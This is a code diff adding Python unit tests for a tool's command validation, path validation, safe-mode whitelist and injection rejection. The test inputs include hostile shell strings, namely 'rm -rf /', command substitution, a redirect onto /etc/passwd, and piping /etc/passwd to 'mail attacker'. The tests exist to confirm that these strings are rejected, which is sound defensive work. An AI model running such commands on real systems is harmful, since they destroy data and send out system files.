@@ -790,6 +790,158 @@ class TestRunCommand(unittest.TestCase):
             self.assertEqual(exit_code, 0)
 
 
+class TestValidateCommand(unittest.TestCase):
+    """Test command validation against shell metacharacters."""
+
+    def test_valid_simple_command(self):
+        self.assertTrue(fieldboard.validate_command("ruff"))
+        self.assertTrue(fieldboard.validate_command("config-drift"))
+        self.assertTrue(fieldboard.validate_command("python3"))
+
+    def test_valid_path_command(self):
+        self.assertTrue(fieldboard.validate_command("/usr/bin/python"))
+        self.assertTrue(fieldboard.validate_command("C:\\Python\\python.exe"))
+        self.assertTrue(fieldboard.validate_command("./local_tool"))
+
+    def test_rejects_semicolon(self):
+        self.assertFalse(fieldboard.validate_command("ruff; rm -rf /"))
+
+    def test_rejects_pipe(self):
+        self.assertFalse(fieldboard.validate_command("ruff | cat"))
+
+    def test_rejects_ampersand(self):
+        self.assertFalse(fieldboard.validate_command("ruff && evil"))
+
+    def test_rejects_backtick(self):
+        self.assertFalse(fieldboard.validate_command("ruff `whoami`"))
+
+    def test_rejects_dollar(self):
+        self.assertFalse(fieldboard.validate_command("$(evil)"))
+
+    def test_rejects_space(self):
+        self.assertFalse(fieldboard.validate_command("ruff check"))
+
+    def test_rejects_redirect(self):
+        self.assertFalse(fieldboard.validate_command("ruff > /etc/passwd"))
+
+    def test_rejects_empty(self):
+        self.assertFalse(fieldboard.validate_command(""))
+
+
+class TestValidateRepoPath(unittest.TestCase):
+    """Test repo path validation."""
+
+    def test_valid_existing_dir(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            is_valid, resolved = fieldboard.validate_repo_path(tmpdir)
+            self.assertTrue(is_valid)
+            self.assertEqual(Path(resolved), Path(tmpdir).resolve())
+
+    def test_invalid_nonexistent(self):
+        is_valid, err = fieldboard.validate_repo_path("/nonexistent/xyz/path")
+        self.assertFalse(is_valid)
+        self.assertIn("cannot resolve", err)
+
+    def test_invalid_file_not_dir(self):
+        fd, path = tempfile.mkstemp()
+        try:
+            os.close(fd)
+            is_valid, err = fieldboard.validate_repo_path(path)
+            self.assertFalse(is_valid)
+            self.assertIn("not a directory", err)
+        finally:
+            os.unlink(path)
+
+    def test_traversal_resolved(self):
+        """Path traversal is resolved to an absolute path (no escape hatch)."""
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sub = Path(tmpdir) / "sub"
+            sub.mkdir()
+            traversal = str(sub / ".." / "sub")
+            is_valid, resolved = fieldboard.validate_repo_path(traversal)
+            self.assertTrue(is_valid)
+            self.assertEqual(Path(resolved), sub.resolve())
+
+
+class TestSafeMode(unittest.TestCase):
+    """Test --safe mode whitelist enforcement."""
+
+    def test_safe_mode_allows_whitelisted(self):
+        tool = {
+            "name": "test",
+            "command": "python",
+            "args": ["-c", "print('ok')"],
+            "enabled": True,
+        }
+        with tempfile.TemporaryDirectory() as tmpdir:
+            result = fieldboard.run_tool(tool, tmpdir, 10, safe_mode=True)
+            self.assertEqual(result["status"], "pass")
+
+    def test_safe_mode_rejects_non_whitelisted(self):
+        tool = {
+            "name": "test",
+            "command": "some-random-binary",
+            "args": [],
+            "enabled": True,
+        }
+        result = fieldboard.run_tool(tool, ".", 10, safe_mode=True)
+        self.assertEqual(result["status"], "skipped")
+        self.assertIn("not whitelisted", result["error"])
+
+    def test_safe_mode_off_allows_any(self):
+        """Without safe mode, non-whitelisted tools are attempted."""
+        tool = {
+            "name": "test",
+            "command": "some-random-binary",
+            "args": [],
+            "enabled": True,
+        }
+        result = fieldboard.run_tool(tool, ".", 10, safe_mode=False)
+        # Skipped for "not found on PATH", not for whitelist
+        self.assertEqual(result["status"], "skipped")
+        self.assertIn("not found on PATH", result["error"])
+
+    def test_safe_mode_whitelist_uses_basename(self):
+        """Whitelist matches on the command basename, not full path."""
+        base = Path(sys.executable).name
+        if base in fieldboard.SAFE_TOOL_WHITELIST or base.startswith("python"):
+            tool = {
+                "name": "test",
+                "command": sys.executable,
+                "args": ["-c", "print('ok')"],
+                "enabled": True,
+            }
+            with tempfile.TemporaryDirectory() as tmpdir:
+                result = fieldboard.run_tool(tool, tmpdir, 10, safe_mode=True)
+                self.assertIn(result["status"], ["pass", "skipped"])
+
+
+class TestCommandInjectionRejected(unittest.TestCase):
+    """Test that injection attempts are rejected at run_tool level."""
+
+    def test_run_tool_rejects_injection(self):
+        tool = {
+            "name": "evil",
+            "command": "ruff; rm -rf /",
+            "args": [],
+            "enabled": True,
+        }
+        result = fieldboard.run_tool(tool, ".", 10)
+        self.assertEqual(result["status"], "skipped")
+        self.assertIn("unsafe characters", result["error"])
+
+    def test_run_tool_rejects_pipe_injection(self):
+        tool = {
+            "name": "evil",
+            "command": "cat /etc/passwd | mail attacker",
+            "args": [],
+            "enabled": True,
+        }
+        result = fieldboard.run_tool(tool, ".", 10)
+        self.assertEqual(result["status"], "skipped")
+        self.assertIn("unsafe characters", result["error"])
+
+
 class TestInitCommand(unittest.TestCase):
     """Test init command."""
 
